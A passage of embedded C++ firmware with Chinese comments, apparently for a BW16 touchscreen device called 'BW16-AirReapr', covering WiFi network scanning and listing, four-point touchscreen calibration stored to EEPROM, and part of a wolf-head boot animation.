      if (u8g2_for_adafruit_gfx.getUTF8Width(sub.c_str()) <= maxW)
        lo = mid;
      else
        hi = mid - 1;
    }
    // 回退确保不切断多字节UTF-8字符
    while (lo > 0 && ((uint8_t)s[lo] & 0xC0) == 0x80) lo--;
    ap.ssid_display = s.substring(0, lo);
  }
}

// 发起WiFi扫描（阻塞等待，超时可配置）
// showUI=true: 扫描后自动跳转WiFi列表屏; false: 仅串口输出
// timeoutMs: 扫描超时毫秒 (默认2500, 快速扫描建议5000)
int scanNetworks(bool showUI, unsigned long timeoutMs) {
  Serial.println("扫描WiFi网络中...");
  scan_results.clear();
  g_scanDone = false;

  // === 扫描动画屏幕（仅快速扫描 5s 模式）===
  bool doAnimation = (showUI && timeoutMs >= 4500);
  if (doAnimation) {
    tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_TITLE_TEXT);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    const char* title = "快速扫描中...";
    int tw = u8g2_for_adafruit_gfx.getUTF8Width(title);
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 90);
    u8g2_for_adafruit_gfx.print(title);

    // 进度条边框
    int barX = 20, barY = 130, barW = 200, barH = 24;
    tft.drawRect(barX, barY, barW, barH, COLOR_AREA_LINE);
  }

  unsigned long startMs = millis();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    unsigned long lastDraw = 0;
    int animFrame = 0;
    const char spinner[] = {'|', '/', '-', '\\'};

    while (!g_scanDone && (millis() - startMs) < timeoutMs) {
      delay(10);

      // === 每 180ms 刷新一次动画 ===
      if (doAnimation) {
        unsigned long now = millis();
        if (now - lastDraw >= 180) {
          lastDraw = now;
          animFrame = (animFrame + 1) & 3;

          int barX = 20, barY = 130, barW = 200, barH = 24;
          unsigned long elapsed = now - startMs;
          int progressPx = (int)((unsigned long long)elapsed * barW / timeoutMs);
          if (progressPx > barW) progressPx = barW;
          int fillPx = progressPx - 2;
          if (fillPx < 0) fillPx = 0;

          // 进度条填充（从绿到蓝渐变）
          uint16_t barColor = (progressPx < barW / 2) ? COLOR_SIGNAL_GOOD : COLOR_TITLE_BG;
          tft.fillRect(barX + 1, barY + 1, fillPx, barH - 2, barColor);
          if (fillPx < barW - 2)
            tft.fillRect(barX + 1 + fillPx, barY + 1, barW - 2 - fillPx, barH - 2, COLOR_BG);

          // 旋转指示符
          u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
          u8g2_for_adafruit_gfx.setForegroundColor(COLOR_MENU_TEXT);
          u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
          char spinStr[4];
          snprintf(spinStr, sizeof(spinStr), " %c", spinner[animFrame]);
          int sx = u8g2_for_adafruit_gfx.getUTF8Width(spinStr);
          u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - sx) / 2, 120);
          u8g2_for_adafruit_gfx.print(spinStr);

          // 已发现网络数
          String cnt = String(scan_results.size()) + " AP";
          u8g2_for_adafruit_gfx.setForegroundColor(COLOR_MENU_TEXT);
          int cw = u8g2_for_adafruit_gfx.getUTF8Width(cnt.c_str());
          u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - cw) / 2, 175);
          u8g2_for_adafruit_gfx.print(cnt);
        }
      }
    }

    // === 动画收尾：填满进度条 ===
    if (doAnimation) {
      int barX = 20, barY = 130, barW = 200, barH = 24;
      tft.fillRect(barX + 1, barY + 1, barW - 2, barH - 2, COLOR_SIGNAL_GOOD);
      u8g2_for_adafruit_gfx.setForegroundColor(COLOR_TITLE_TEXT);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_SIGNAL_GOOD);
      const char* done = "扫描完成!";
      int dw = u8g2_for_adafruit_gfx.getUTF8Width(done);
      u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - dw) / 2, barY + 18);
      u8g2_for_adafruit_gfx.print(done);
      delay(400); // 短暂停留让用户看到完成
    }

    // === BSSID去重（驱动可能重复上报同一AP）===
    {
      std::set<String> seenBSSID;
      std::vector<WiFiScanResult> deduped;
      for (auto& r : scan_results) {
        if (seenBSSID.find(r.bssid_str) == seenBSSID.end()) {
          seenBSSID.insert(r.bssid_str);
          deduped.push_back(r);
        }
      }
      if (deduped.size() < scan_results.size()) {
        Serial.print("[去重] 移除 ");
        Serial.print(scan_results.size() - deduped.size());
        Serial.println(" 个重复项");
      }
      scan_results = std::move(deduped);
    }

    // === SSID预截断缓存（一次计算，N次绘制复用）===
    preTruncateSSIDs();

    Serial.print("扫描完成! 发现 ");
    Serial.print(scan_results.size());
    Serial.println(" 个网络");

    // 打印扫描结果到串口
    for (size_t i = 0; i < scan_results.size(); i++) {
      Serial.print("  [");
      Serial.print(i + 1);
      Serial.print("] ");
      Serial.print(scan_results[i].ssid);
      Serial.print(" | BSSID:");
      Serial.print(scan_results[i].bssid_str);
      Serial.print(" | Ch:");
      Serial.print(scan_results[i].channel);
      Serial.print(" | RSSI:");
      Serial.print(scan_results[i].rssi);
      Serial.println("dBm");
    }

    // 更新多选标记与扫描结果对齐
    selectedFlags.assign(scan_results.size(), 0);
    wifiScrollOffset = 0;
    wifiCursorIndex = -1;

    // 自动进入 WiFi 列表屏幕（可选）
    if (showUI) {
      g_screen = SCREEN_WIFI_LIST;
      drawWiFiListScreen();
    }

    return 0;
  } else {
    Serial.println("扫描启动失败!");
    return 1;
  }
}

// ==================== 触摸校准 ====================
struct CalibPoint {
  int screenX, screenY;
  const char* label;
};

static const CalibPoint g_calibPoints[] = {
  { 10,  10,  "左上角" },
  { 230, 10,  "右上角" },
  { 230, 310, "右下角" },
  { 10,  310, "左下角" }
};

// 绘制校准十字准星
static void drawCalibCrosshair(int cx, int cy, uint16_t color, int size) {
  tft.drawLine(cx - size, cy, cx + size, cy, color);
  tft.drawLine(cx, cy - size, cx, cy + size, color);
  tft.drawCircle(cx, cy, size + 4, color);
  tft.drawCircle(cx, cy, size + 6, color);
}

// ADC值是否表示有效触摸（非极限值）
static inline bool calibTouchValid(uint16_t v) {
  return (v > 5 && v < 4090);
}

// 校准模式下检测返回（屏幕底部触摸，兼容正/反Y轴）
static inline bool calibIsBack(uint16_t rx, uint16_t ry) {
  if (!calibTouchValid(rx)) return false;
  // 底部可能在rawY低值区（Y轴反转）或高值区（正常Y轴）
  return (ry < 600) || (ry > 3500 && ry < 4090);
}

void homeActionTouchCalibrate(bool skipPrompt) {
  uint16_t rawX[4] = {0}, rawY[4] = {0};

  // 保存当前校准值
  int savedMinX = g_tsMinX, savedMaxX = g_tsMaxX;
  int savedMinY = g_tsMinY, savedMaxY = g_tsMaxY;
  // 设为极宽范围，确保所有位置触摸都能检测到
  g_tsMinX = 6; g_tsMaxX = 4089;
  g_tsMinY = 6; g_tsMaxY = 4089;

  bool calibCancelled = false;

  do {
    // ===== 提示界面（手动进入时显示，自动校准时跳过）=====
    if (!skipPrompt) {
      tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);

    const char* title = "触摸屏校准";
    int tw = u8g2_for_adafruit_gfx.getUTF8Width(title);
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 50);
    u8g2_for_adafruit_gfx.print(title);

    u8g2_for_adafruit_gfx.setCursor(5, 80);
    u8g2_for_adafruit_gfx.print("依次点击屏幕四个角的十字准星");
    u8g2_for_adafruit_gfx.setCursor(5, 105);
    u8g2_for_adafruit_gfx.print("按住中心直到变绿后松开");

    // 开始/返回按钮
    drawButton(65, 150, 110, 42, COLOR_CONFIRM_BG, "开始校准", COLOR_WHITE);
    drawButton(65, 210, 110, 42, COLOR_BTN_BACK, "返回", COLOR_WHITE);

    while (true) {
        int16_t tx, ty;
      if (touch_read(&tx, &ty)) {
        if (tx >= 65 && tx <= 175 && ty >= 150 && ty <= 192) break;          // 开始
        if (tx >= 65 && tx <= 175 && ty >= 210 && ty <= 252) {               // 返回
          calibCancelled = true; break;
        }
        while (touch_read(&tx, &ty)) delay(10);
      }
      delay(20);
    }
    if (calibCancelled) break;
    delay(200);
    } else {
      // 自动启动模式：短暂提示后直接开始4点采集
      tft.fillScreen(COLOR_BG);
      u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
      u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
      const char* at = "自动触摸校准";
      int aw = u8g2_for_adafruit_gfx.getUTF8Width(at);
      u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - aw) / 2, 130);
      u8g2_for_adafruit_gfx.print(at);
      const char* hint = "即将开始，点击四角十字准星";
      int hw = u8g2_for_adafruit_gfx.getUTF8Width(hint);
      u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - hw) / 2, 160);
      u8g2_for_adafruit_gfx.print(hint);
      delay(2000);
    }

    // ===== 逐点采集 (4点) =====
  retryCalibCapture:
    // 确保采集阶段使用宽范围（重试时需要重置）
    g_tsMinX = 6; g_tsMaxX = 4089;
    g_tsMinY = 6; g_tsMaxY = 4089;
    for (int pt = 0; pt < 4; pt++) {
      int cx = g_calibPoints[pt].screenX;
      int cy = g_calibPoints[pt].screenY;

      tft.fillScreen(COLOR_BG);
      u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
      u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);

      u8g2_for_adafruit_gfx.setCursor(5, 20);
      String stepLabel = "步骤 " + String(pt + 1) + "/4";
      u8g2_for_adafruit_gfx.print(stepLabel);

      u8g2_for_adafruit_gfx.setCursor(5, 42);
      u8g2_for_adafruit_gfx.print("点击");
      u8g2_for_adafruit_gfx.print(g_calibPoints[pt].label);
      u8g2_for_adafruit_gfx.print("十字中心");

      u8g2_for_adafruit_gfx.setCursor(5, 65);
      u8g2_for_adafruit_gfx.print("ADC: ---- / ----");

      // 底部放"返回"文字
      u8g2_for_adafruit_gfx.setForegroundColor(0x7BEF);
      u8g2_for_adafruit_gfx.setCursor(10, SCREEN_HEIGHT - 15);
      u8g2_for_adafruit_gfx.print("返回");

      drawCalibCrosshair(cx, cy, COLOR_WHITE, 14);

      // 等待触摸按住
      bool touched = false;
      unsigned long holdStart = 0;
      unsigned long lastInvalidTime = 0;

      while (!touched) {
        uint16_t ry = xpt2046_transfer(0x90);  // rawY → screenY
        uint16_t rx = xpt2046_transfer(0xD0);  // rawX → screenX

        // 实时ADC值覆盖显示
        u8g2_for_adafruit_gfx.setForegroundColor(COLOR_BG);
        u8g2_for_adafruit_gfx.setCursor(40, 65);
        u8g2_for_adafruit_gfx.print("ADC: ---- / ----");
        u8g2_for_adafruit_gfx.setForegroundColor(COLOR_MENU_TEXT);  // 青色
        u8g2_for_adafruit_gfx.setCursor(40, 65);
        u8g2_for_adafruit_gfx.print("ADC: ");
        u8g2_for_adafruit_gfx.print(rx);
        u8g2_for_adafruit_gfx.print(" / ");
        u8g2_for_adafruit_gfx.print(ry);

        if (calibTouchValid(rx) && calibTouchValid(ry)) {
          lastInvalidTime = 0;
          if (holdStart == 0) {
            holdStart = millis();
            drawCalibCrosshair(cx, cy, COLOR_TITLE_TEXT, 14);  // 黄色=触摸中
          } else if (millis() - holdStart > 400) {
            // 按住超400ms → 确认采集
            rawX[pt] = rx;
            rawY[pt] = ry;
            touched = true;
            drawCalibCrosshair(cx, cy, COLOR_CHK_ON, 14);       // 绿色=已采集
            tft.fillCircle(cx, cy, 6, COLOR_CHK_ON);
            Serial.print("校准点 "); Serial.print(pt + 1);
            Serial.print(": rawX="); Serial.print(rx);
            Serial.print(" rawY="); Serial.println(ry);
          } else {
            drawCalibCrosshair(cx, cy, COLOR_TITLE_TEXT, 14);
          }
        } else {
          // 防抖：短暂丢触摸不重置计时(150ms容忍)
          if (lastInvalidTime == 0) {
            lastInvalidTime = millis();
          } else if (millis() - lastInvalidTime > 150) {
            holdStart = 0;
          }
          drawCalibCrosshair(cx, cy, COLOR_WHITE, 14);
          // 无触摸时检测返回
          if (calibIsBack(rx, ry)) { calibCancelled = true; delay(200); pt = 4; break; }
        }
        delay(30);
      }

      if (calibCancelled) break;

      // 等待释放触摸
      delay(200);
      unsigned long waitStart = millis();
      while (millis() - waitStart < 800) {
        uint16_t ry = xpt2046_transfer(0x90);
        uint16_t rx = xpt2046_transfer(0xD0);
        if (!calibTouchValid(rx) || !calibTouchValid(ry)) break;
        delay(30);
      }

      // 成功反馈
      tft.fillScreen(COLOR_BG);
      u8g2_for_adafruit_gfx.setForegroundColor(COLOR_CHK_ON);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
      String doneMsg = String("点") + String(pt + 1) + "/4 采集成功!";
      int dw = u8g2_for_adafruit_gfx.getUTF8Width(doneMsg.c_str());
      u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - dw) / 2, 140);
      u8g2_for_adafruit_gfx.print(doneMsg);
      delay(500);
    }

    if (calibCancelled) break;

    // ===== 直接 min/max 校准（检测轴反转，g_tsMin存屏幕0边的raw值）=====
    // XPT2046: rawX(0xD0)=X水平→screenX, rawY(0x90)=Y垂直→screenY
    // 约定: g_tsMinX=screenX=0处的raw值, g_tsMaxX=screenX=max处的raw值
    //        g_tsMinY=screenY=0处的raw值, g_tsMaxY=screenY=max处的raw值
    // 轴反转时 g_tsMin > g_tsMax (touch_read做专门处理)

    // 检测X轴是否反转: 左列screenX≈10 vs 右列screenX≈230
    float leftRawX  = (rawX[0] + rawX[3]) / 2.0f;   // 点0+点3=左列
    float rightRawX = (rawX[1] + rawX[2]) / 2.0f;   // 点1+点2=右列
    bool xInverted = (leftRawX > rightRawX);

    // 检测Y轴是否反转: 顶行screenY≈10 vs 底行screenY≈310
    float topRawY    = (rawY[0] + rawY[1]) / 2.0f;   // 点0+点1=顶行
    float bottomRawY = (rawY[2] + rawY[3]) / 2.0f;   // 点2+点3=底行
    bool yInverted = (topRawY > bottomRawY);

    // 计算min/max（纯数值范围）
    int numMinX = rawX[0], numMaxX = rawX[0];
    int numMinY = rawY[0], numMaxY = rawY[0];
    for (int i = 1; i < 4; i++) {
      if (rawX[i] < numMinX) numMinX = rawX[i];
      if (rawX[i] > numMaxX) numMaxX = rawX[i];
      if (rawY[i] < numMinY) numMinY = rawY[i];
      if (rawY[i] > numMaxY) numMaxY = rawY[i];
    }

    int marginX = (numMaxX - numMinX) / 10;
    int marginY = (numMaxY - numMinY) / 10;
    if (marginX < 20) marginX = 20;
    if (marginY < 20) marginY = 20;

    // 设置校准值：g_tsMin→屏幕0边, g_tsMax→屏幕MAX边
    if (xInverted) {
      g_tsMinX = numMaxX + marginX;  // 右边缘raw值 → screenX=0
      g_tsMaxX = numMinX - marginX;  // 左边缘raw值 → screenX=max
    } else {
      g_tsMinX = numMinX - marginX;  // 左边缘raw值 → screenX=0
      g_tsMaxX = numMaxX + marginX;  // 右边缘raw值 → screenX=max
    }
    if (yInverted) {
      g_tsMinY = numMaxY + marginY;  // 顶边缘raw值 → screenY=0
      g_tsMaxY = numMinY - marginY;  // 底边缘raw值 → screenY=max
    } else {
      g_tsMinY = numMinY - marginY;
      g_tsMaxY = numMaxY + marginY;
    }

    // 安全限幅
    if (g_tsMinX < 0)  g_tsMinX = 0;
    if (g_tsMaxX > 4095) g_tsMaxX = 4095;
    if (g_tsMinX > 4095) g_tsMinX = 4095;
    if (g_tsMaxX < 0)  g_tsMaxX = 0;
    if (g_tsMinY < 0)  g_tsMinY = 0;
    if (g_tsMaxY > 4095) g_tsMaxY = 4095;
    if (g_tsMinY > 4095) g_tsMinY = 4095;
    if (g_tsMaxY < 0)  g_tsMaxY = 0;

    int rangeX = (g_tsMinX > g_tsMaxX) ? (g_tsMinX - g_tsMaxX) : (g_tsMaxX - g_tsMinX);
    int rangeY = (g_tsMinY > g_tsMaxY) ? (g_tsMinY - g_tsMaxY) : (g_tsMaxY - g_tsMinY);

    // 打印4点原始值便于诊断
    Serial.println("=== 校准4点原始值 ===");
    for (int i = 0; i < 4; i++) {
      Serial.print(" 点"); Serial.print(i); Serial.print(": rawX="); Serial.print(rawX[i]); Serial.print(" rawY="); Serial.println(rawY[i]);
    }
    Serial.println("=== 校准计算完成 ===");
    Serial.print("MINX="); Serial.print(g_tsMinX);
    Serial.print(" MAXX="); Serial.print(g_tsMaxX);
    Serial.print(" 范围X="); Serial.print(rangeX);
    Serial.print(" | MINY="); Serial.print(g_tsMinY);
    Serial.print(" MAXY="); Serial.print(g_tsMaxY);
    Serial.print(" 范围Y="); Serial.println(rangeY);

    // 校准有效性检查：范围必须足够宽（≥500）才能正确映射坐标
    if (rangeX < 500 || rangeY < 500) {
      Serial.println("[错误] 校准数据无效(范围过窄)，请确保点击了屏幕四角的十字准星");

      // 恢复旧校准值（可能是默认宽范围）
      g_tsMinX = savedMinX; g_tsMaxX = savedMaxX;
      g_tsMinY = savedMinY; g_tsMaxY = savedMaxY;
      // 清除本次无效数据，不保存到EEPROM
      Serial.println("已恢复旧校准值，校准数据未保存");

      // 显示失败界面
      tft.fillScreen(COLOR_BG);
      u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
      u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
      const char* errTitle = "校准失败";
      int etw = u8g2_for_adafruit_gfx.getUTF8Width(errTitle);
      u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - etw) / 2, 40);
      u8g2_for_adafruit_gfx.print(errTitle);

      u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
      u8g2_for_adafruit_gfx.setCursor(5, 90);
      u8g2_for_adafruit_gfx.print("触摸范围过窄，校准无效");
      u8g2_for_adafruit_gfx.setCursor(5, 115);
      u8g2_for_adafruit_gfx.print("请务必点击屏幕四角的十字中心！");
      u8g2_for_adafruit_gfx.setCursor(5, 140);
      char rbuf[50];
      snprintf(rbuf, sizeof(rbuf), "X范围=%d Y范围=%d (需≥500)", rangeX, rangeY);
      u8g2_for_adafruit_gfx.print(rbuf);

      drawButton(45, 180, 150, 42, COLOR_CONFIRM_BG, "重新校准", COLOR_WHITE);
      drawButton(45, 240, 150, 42, COLOR_BTN_BACK, "返回主页", COLOR_WHITE);

      // 失败后等待用户选择：重试 或 返回
      bool wantRetry = false;
      while (true) {
            int16_t tx, ty;
        // 失败界面需要用旧校准值读取触摸
        if (touch_read(&tx, &ty)) {
          if (tx >= 45 && tx <= 195 && ty >= 180 && ty <= 222) { wantRetry = true; break; }
          if (tx >= 45 && tx <= 195 && ty >= 240 && ty <= 282) { wantRetry = false; break; }
          while (touch_read(&tx, &ty)) delay(10);
        }
        delay(20);
      }
      delay(200);

      if (wantRetry) {
        // 重试：恢复宽范围并跳回采集步骤
        g_tsMinX = 6; g_tsMaxX = 4089;
        g_tsMinY = 6; g_tsMaxY = 4089;
        calibCancelled = false;
        // 使用 goto 跳回采集循环开始处 (4-point capture)
        goto retryCalibCapture;
      } else {
        calibCancelled = true;
        break;
      }
    }

    // 验证通过，保存到EEPROM
    saveCalibrationToEEPROM();
    Serial.println("校准数据已保存到EEPROM");

    // ===== 自动验证：回算4点映射坐标精度 =====
    Serial.println("=== 自动验证映射精度 ===");
    float maxErrX = 0, maxErrY = 0;
    for (int i = 0; i < 4; i++) {
      int16_t mapX = map(rawX[i], g_tsMinX, g_tsMaxX, 0, SCREEN_WIDTH);
      int16_t mapY = map(rawY[i], g_tsMinY, g_tsMaxY, 0, SCREEN_HEIGHT);
      int16_t expX = g_calibPoints[i].screenX;
      int16_t expY = g_calibPoints[i].screenY;
      float errX = abs(mapX - expX);
      float errY = abs(mapY - expY);
      if (errX > maxErrX) maxErrX = errX;
      if (errY > maxErrY) maxErrY = errY;
      Serial.print(" 点"); Serial.print(i + 1);
      Serial.print(" "); Serial.print(g_calibPoints[i].label);
      Serial.print(": 期望("); Serial.print(expX); Serial.print(","); Serial.print(expY);
      Serial.print(") 映射("); Serial.print(mapX); Serial.print(","); Serial.print(mapY);
      Serial.print(") 偏差X="); Serial.print(errX, 1);
      Serial.print(" Y="); Serial.println(errY, 1);
    }
    Serial.print("最大偏差: X="); Serial.print(maxErrX, 1);
    Serial.print("px  Y="); Serial.print(maxErrY, 1);
    Serial.println("px");
    if (maxErrX <= 2.0f && maxErrY <= 2.0f) {
      Serial.println("[精度] 优秀 (≤2px)");
    } else if (maxErrX <= 5.0f && maxErrY <= 5.0f) {
      Serial.println("[精度] 良好 (≤5px)");
    } else {
      Serial.println("[精度] 一般, 建议重新校准");
    }

    // 完成提示
    tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_CHK_ON);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    const char* doneTitle = "校准完成!";
    int tw = u8g2_for_adafruit_gfx.getUTF8Width(doneTitle);
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 60);
    u8g2_for_adafruit_gfx.print(doneTitle);

    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    u8g2_for_adafruit_gfx.setCursor(15, 100);
    u8g2_for_adafruit_gfx.print("数据已保存到EEPROM");

    char buf[60];
    snprintf(buf, sizeof(buf), "X:%d-%d Y:%d-%d", g_tsMinX, g_tsMaxX, g_tsMinY, g_tsMaxY);
    u8g2_for_adafruit_gfx.setCursor(15, 130);
    u8g2_for_adafruit_gfx.print(buf);

    drawButton(20,  180, 90, 40, COLOR_CONFIRM_BG, "确认",  COLOR_WHITE);
    drawButton(130, 180, 90, 40, COLOR_BTN_BACK,   "测坐标", COLOR_WHITE);

    bool doTestCoord = false;
    while (true) {
        int16_t tx, ty;
      if (touch_read(&tx, &ty)) {
        if (tx >= 20 && tx <= 110 && ty >= 180 && ty <= 220) break;        // 确认
        if (tx >= 130 && tx <= 220 && ty >= 180 && ty <= 220) { doTestCoord = true; break; } // 测坐标
        while (touch_read(&tx, &ty)) delay(10);
      }
      delay(20);
    }

    // ===== 自动校准后触摸坐标测试 =====
    if (doTestCoord) {
      tft.fillScreen(COLOR_BG);

      // 标题栏
      tft.fillRect(0, 0, SCREEN_WIDTH, 36, COLOR_TITLE_BG);
      u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
      u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
      u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_TITLE_BG);
      const char* coordTitle = "触摸坐标测试";
      int ctw = u8g2_for_adafruit_gfx.getUTF8Width(coordTitle);
      u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - ctw) / 2, 26);
      u8g2_for_adafruit_gfx.print(coordTitle);

      // 坐标显示区域背景
      tft.fillRect(10, 48, SCREEN_WIDTH - 20, 100, 0x0841);
      tft.drawRect(10, 48, SCREEN_WIDTH - 20, 100, 0x18E7);

      // 底部按钮
      drawButton(BTN_W * 3, BTN_BAR_Y + 2, BTN_W, BTN_H, COLOR_BTN_BACK, "返回", COLOR_WHITE);

      int lastDispX = -1, lastDispY = -1;
      int lastRawX = -1, lastRawY = -1;
      bool hadTouch = false;

      while (true) {
            int16_t ttx, tty;

        if (touch_read(&ttx, &tty)) {
          // 直接使用 touch_read 内部已存储的原始ADC值（不再额外SPI读取）
          int rawValX = (int)g_lastRawX;
          int rawValY = (int)g_lastRawY;

          // 检测底部返回按钮
          AreaType area = checkTouchArea(ttx, tty);
          if (area == AREA_BTN_BACK) {
            while (touch_read(&ttx, &tty)) delay(10);
            break;
          }

          if (ttx != lastDispX || tty != lastDispY ||
              rawValX != lastRawX || rawValY != lastRawY) {

            lastDispX = ttx; lastDispY = tty;
            lastRawX = rawValX; lastRawY = rawValY;

            // 清除旧坐标文字区域
            tft.fillRect(12, 50, SCREEN_WIDTH - 24, 96, 0x0841);

            // 绘制十字准星指示触摸点
            int cx = constrain(ttx, 15, SCREEN_WIDTH - 15);
            int cy = constrain(tty, 55, 145);
            tft.drawLine(cx - 8, cy, cx + 8, cy, 0xF800);
            tft.drawLine(cx, cy - 8, cx, cy + 8, 0xF800);

            // 显示映射坐标
            u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
            u8g2_for_adafruit_gfx.setForegroundColor(COLOR_CHK_ON);
            u8g2_for_adafruit_gfx.setBackgroundColor(0x0841);

            snprintf(buf, sizeof(buf), "映射: X=%d Y=%d", ttx, tty);
            u8g2_for_adafruit_gfx.setCursor(20, 72);
            u8g2_for_adafruit_gfx.print(buf);

            // 显示原始ADC值
            u8g2_for_adafruit_gfx.setForegroundColor(0x6B8F);
            snprintf(buf, sizeof(buf), "原始: RX=%d RY=%d", lastRawX, lastRawY);
            u8g2_for_adafruit_gfx.setCursor(20, 94);
            u8g2_for_adafruit_gfx.print(buf);

            // 显示区域判断结果
            u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
            const char* areaName = "";
            switch (area) {
              case AREA_BTN_UP:    areaName = "区域: 上按钮"; break;
              case AREA_BTN_DOWN:  areaName = "区域: 下按钮"; break;
              case AREA_BTN_OK:    areaName = "区域: 确认按钮"; break;
              case AREA_BTN_BACK:  areaName = "区域: 返回按钮"; break;
              case AREA_MENU:      areaName = "区域: 菜单"; break;
              default:             areaName = "区域: 空白"; break;
            }
            u8g2_for_adafruit_gfx.setCursor(20, 116);
            u8g2_for_adafruit_gfx.print(areaName);

            // 显示按钮栏参考线（仅首次）：底部按钮栏顶边 + X轴3条纵向分界线
            if (!hadTouch) {
              hadTouch = true;
              tft.drawLine(0, BTN_BAR_Y, SCREEN_WIDTH, BTN_BAR_Y, 0x18E7);  // 按钮栏顶边
              tft.drawFastVLine(BTN_W,     BTN_BAR_Y, BTN_BAR_H, 0x0861);   // 上|下
              tft.drawFastVLine(BTN_W * 2, BTN_BAR_Y, BTN_BAR_H, 0x0861);   // 下|确认
              tft.drawFastVLine(BTN_W * 3, BTN_BAR_Y, BTN_BAR_H, 0x0861);   // 确认|返回
              // 菜单区域顶边
              tft.drawLine(0, MENU_AREA_Y - 2, SCREEN_WIDTH, MENU_AREA_Y - 2, 0x18E7);
            }

            Serial.print("[坐标] 映射X="); Serial.print(ttx);
            Serial.print(" Y="); Serial.print(tty);
            Serial.print(" | 原始RX="); Serial.print(lastRawX);
            Serial.print(" RY="); Serial.println(lastRawY);
          }
        }
        delay(30);
      }

      // 退出坐标测试
      Serial.println("[坐标] 坐标测试结束");
    }

  } while(0);

  // 取消则恢复旧值
  if (calibCancelled) {
    g_tsMinX = savedMinX; g_tsMaxX = savedMaxX;
    g_tsMinY = savedMinY; g_tsMaxY = savedMaxY;
    Serial.println("校准已取消，恢复旧校准值");
  }

  // 返回主菜单
  g_screen = SCREEN_MAIN;
  drawMenuUI();
}

// ==================== 狼魂 BW16-AirReapr 专用开机动画 ====================

static void drawWolfBootAnimation() {
  // ── Phase 1: 黑色幕布拉开 ──
  tft.fillScreen(0x0000);
  delay(150);

  // 狼头中心坐标
  const int cx = 120, cy = 130;

  // ── Phase 2: 从黑暗中浮现 ──
  // 背景光晕（从屏幕中央扩散）
  for (int r = 0; r <= 90; r += 3) {
    uint16_t glowColor = (r < 30) ? 0x1082 : (r < 60) ? 0x2104 : 0x3186;
    tft.fillCircle(cx, cy, r, glowColor);
    delay(8);
  }

  // ── Phase 3: 狼魂图标绘制 ──

  // 左耳外廓 (填充三角形)
  tft.fillTriangle(42, 65,  88, 42,  88, 85, 0x39A7);
  tft.fillTriangle(88, 42,  78, 35,  68, 50, 0x3186);

  // 左耳内廓
  tft.fillTriangle(52, 65,  80, 52,  80, 78, 0x528A);

  // 右耳外廓
  tft.fillTriangle(198, 65,  152, 42,  152, 85, 0x39A7);
  tft.fillTriangle(152, 42,  162, 35,  172, 50, 0x3186);

  // 右耳内廓
  tft.fillTriangle(188, 65,  160, 52,  160, 78, 0x528A);

  // 头部主体 (大椭圆 - 用两个圆近似)
  tft.fillCircle(cx, cy + 15, 52, 0x39A7);      // 下半脸
  tft.fillCircle(cx, cy - 5, 48, 0x39A7);       // 上半脸
  tft.fillRect(cx - 50, cy - 10, 100, 35, 0x39A7); // 填充中间

  // 头顶毛发 (锯齿状)
  tft.fillTriangle(cx - 40, cy - 52,  cx - 25, cy - 55,  cx - 32, cy - 42, 0x39A7);
  tft.fillTriangle(cx - 20, cy - 56,  cx - 5,  cy - 56,  cx - 12, cy - 44, 0x39A7);
  tft.fillTriangle(cx + 0,  cy - 57,  cx + 15, cy - 55,  cx + 8,  cy - 43, 0x39A7);
  tft.fillTriangle(cx + 18, cy - 56,  cx + 33, cy - 52,  cx + 26, cy - 42, 0x39A7);

  // 头部高光
  tft.fillCircle(cx - 20, cy - 18, 16, 0x4A69);
  tft.fillCircle(cx + 18, cy - 20, 12, 0x4A69);

  delay(200);

  // ── 眼睛 (发光效果) ──
  // 左眼眼眶
  tft.fillCircle(cx - 25, cy - 5, 13, 0x0000);
  tft.fillCircle(cx - 24, cy - 4, 11, 0xFFFF);
  // 左眼虹膜
  tft.fillCircle(cx - 25, cy - 5, 7, 0xED20);   // 橙金色
  // 右眼眼眶
